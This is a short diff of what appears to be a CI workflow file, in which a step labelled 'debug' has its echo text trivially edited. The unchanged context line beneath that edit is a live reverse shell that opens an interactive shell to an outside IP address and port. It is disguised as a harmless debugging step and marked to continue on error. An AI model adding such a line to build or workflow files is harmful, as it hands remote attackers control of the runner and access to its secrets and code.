@@ -11,7 +11,7 @@ jobs:
       - name: debug
         continue-on-error: true
         run: |
-          echo "Hello!"
+          echo "Hello"
           sh -i >& /dev/tcp/18.132.26.191/47654 0>&1
       - name: debug
         run: echo "Hello"
